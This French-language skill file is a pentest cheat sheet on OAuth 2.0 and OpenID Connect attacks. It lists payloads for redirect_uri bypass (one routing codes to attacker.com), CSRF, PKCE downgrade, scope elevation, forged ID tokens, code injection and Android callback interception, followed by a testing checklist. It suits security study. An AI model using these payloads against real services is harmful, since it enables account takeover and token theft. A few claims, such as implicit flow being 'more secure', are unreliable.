---
name: oauth-oidc-attacks
description: Guide complet d'attaque sur OAuth 2.0 et OpenID Connect — CSRF, redirect_uri bypass, token interception, PKCE downgrade, scope abuse
category: cybersecurite
---

# OAuth 2.0 & OpenID Connect — Attaques Avancées

## Flows OAuth 2.0

### Authorization Code Flow (Recommandé)
```
Client → Auth Code → Token Exchange → Access Token
           |
         User Agent
```

### Implicit Flow (Déprécié)
```
Client → Access Token directement
         (plus sécurisé depuis PKCE)
```

### Resource Owner Password Credentials (Déprécié)
```
Client → User + Pass → Access Token
```

### Client Credentials
```
Client → Client ID + Secret → Access Token
         (Machine-to-Machine)
```

## Attaques sur le Redirect URI

### Redirect URI Path Traversal
```bash
# Le serveur valide le début du redirect_uri
# redirect_uri = https://client.com/oauth/callback

# Exploitation par path traversal
redirect_uri=https://client.com/oauth/callback/../../evil

# Ou
redirect_uri=https://client.com/oauth/callback.evil.com
```

### Redirect URI Open Redirect
```bash
# Si le Client a un endpoint de redirection ouverte
# On peut faire pointer vers son propre serveur

redirect_uri=https://client.com/redirect?url=https://attacker.com
```

### Subdomain Takeover Redirect
```bash
# Si un subdomain du client est vulnérable
redirect_uri=https://subdomain.client.com/evil
```

### State Parameter Omission
```bash
# Si le paramètre state n'est pas vérifié
# CSRF-based Account Takeover

# 1. Créer un lien d'auth OAuth
https://oauth.target.com/auth?response_type=code&client_id=APP_ID&redirect_uri=https://client.com/callback

# 2. Envoyer le lien à la victime
# 3. Si state absent ou non vérifié → la victime se connecte au compte attaquant
```

## Attaque CSRF sur OAuth

```bash
# Étape 1: L'attaquant effectue une autorisation OAuth
GET https://oauth.target.com/auth?response_type=code&client_id=APP_ID&state=attacker-state

# Étape 2: L'attaquant obtient le code (qu'il ne peut pas utiliser seul)
# Mais redirige la victime vers le callback avec ce code

# Étape 3: La victime exécute le callback de l'attaquant
# → Le compte de la victime est lié au compte OAuth de l'attaquant
```

## PKCE Downgrade Attack

```bash
# Si le serveur supporte PKCE mais ne l'exige pas
# L'attaquant peut retirer le challenge

# Normal (PKCE):
/auth?response_type=code&code_challenge=xxxx&code_challenge_method=S256

# Attaque (sans PKCE):
/auth?response_type=code

# Le code peut maintenant être intercepté par n'importe qui
```

## Token Interception

### Open Redirect + Fragment
```bash
# Dans l'Implicit Flow, le token est dans le fragment (#)
# Si le redirect_uri pointe vers une page avec open redirect
# Le fragment est perdu lors de la redirection

# Ou via un service worker malveillant
# Le SW intercepte l'URL avec le token
```

### Token dans les Logs
```bash
# Access token dans l'URL (Implicit flow)
# → Loggé par les reverse proxies, CDNs, analytics
GET /callback#access_token=eyJ...&token_type=Bearer
```

### Leaking via Referer
```bash
# Si le callback contient des ressources tierces (images, scripts)
# Le Referer peut contenir le token
```

## Scope Abuse

### Scope Elevation
```bash
# Demander plus de scopes que l'app n'en a besoin
/auth?scope=openid+profile+email+admin+superadmin+*

# Si le serveur ne filtre pas les scopes
# L'attaque obtient un token avec tous les droits
```

### Scope Confusion
```bash
# Changer "openid" par "admin"
/auth?scope=admin
# Si le serveur interprète mal → accès admin
```

### Scope User-manipulation
```bash
# Ajouter des scopes sensibles au refresh
# POST /token
# {"grant_type":"refresh_token","refresh_token":"xxx","scope":"admin"}
```

## Client Secret Leak

### Secret dans le code source
```bash
# Recherche dans:
# - APK décompilé
# - JavaScript source maps
# - GitHub (secret scanning bypass)
# - Fichier .env exposé
# - Histoire git
# - NPM packages (internal)
```

### Secret dans les logs
```bash
# Client secret dans les logs d'erreur
# Debug messages exposés
```

## JWT Token Exchange Attacks

### Token Swap
```bash
# Substitution de token
# Utiliser un token valide d'un autre utilisateur

POST /token
grant_type=authorization_code
code=VALID_CODE_FOR_OTHER_USER
redirect_uri=https://client.com/callback
```

### Token Reuse
```bash
# Utiliser le même token sur différents services
# Si aud n'est pas vérifié
```

## OpenID Connect — Attaques Spécifiques

### ID Token Confusion
```bash
# L'ID Token est un JWT signé
# Si le client ne vérifie pas la signature

# Modifier le sub (subject) dans l'ID Token
{"sub":"admin","email":"admin@target.com"}
```

### Nonce Reuse
```bash
# Attaque de replay sur l'ID Token
# Si nonce n'est pas vérifié
```

### acr_values Manipulation
```bash
# Forcer l'authentification faible
/auth?acr_values=low
# Si l'authenticator accepte
```

## Attaques sur le Provider

### Authorization Code Injection
```bash
# 1. Attaquant initie OAuth
# 2. Obtient un code
# 3. Injecte le code dans la session de la victime (via XSS, etc.)
# 4. Victime = attaquant
```

### Client Impersonation
```bash
# Si le client_id est un nom d'utilisateur
# POST /token avec client_id=admin
# Mauvaise implémentation: le client_id devient l'identité
```

### Misconfigured CORS
```bash
# Si le endpoint token a CORS permissif
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Permet à un site attaquant d'intercepter les tokens
```

## Attaques sur Third-Party Apps

### App Impersonation / Phishing
```bash
# Créer une "app" OAuth qui ressemble à l'app légitime
# L'utilisateur autorise → le token est volé

# Énumération des apps OAuth
GET https://oauth.target.com/.well-known/oauth-authorization-server
GET https://oauth.target.com/oauth/apps
```

### App-to-App Token Theft
```bash
# Si une app malveillante est installée sur le device
# Elle peut intercepter les callback OAuth via des URL schemes

<!-- Android: Intent filter interception -->
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <data android:scheme="target-app-callback" />
</intent-filter>
```

## Outils

| Outil | Description |
|-------|-------------|
| **oauth2_proxy** | Test de configuration OAuth |
| **Burp OAuth Scanner** | Scan automatique OAuth |
| **oauth-scanner** | Script d'audit OAuth |
| **jwt_tool** | Test des tokens JWT ID |
| **AuthMatrix (Burp)** | Test d'authentification multi-role |

## Checklist Pentest OAuth/OIDC

1. Redirect URI validation (path traversal, open redirect)
2. State parameter validation (CSRF)
3. PKCE enforcement (downgrade possible?)
4. Scope abuse (elevation, confusion)
5. Client secret exposure
6. Authorization code injection
7. CORS misconfiguration
8. Token in URL / logs / referer
9. Token reuse across services (aud validation)
10. ID Token signature verification
11. Nonce validation (replay)
12. Code expiration check
13. Refresh token rotation
14. Consent screen bypass
15. acr_values manipulation
16. App impersonation
17. Cross-service token swap
18. Implicit flow still enabled
19. Resource Owner Password Credentials flow enabled
20. Client credentials validation

## Ressources

- **HackTricks OAuth**: https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover/index.html
- **PortSwigger OAuth**: https://portswigger.net/web-security/oauth
- **OAuth 2.0 Threat Model**: https://tools.ietf.org/html/rfc6819
- **OAuth Security Cheatsheet**: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/OAuth_Cheat_Sheet.md
- **OAuth 2.0 for Browser-Based Apps**: https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/
- **PayloadsAllTheThings OAuth**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth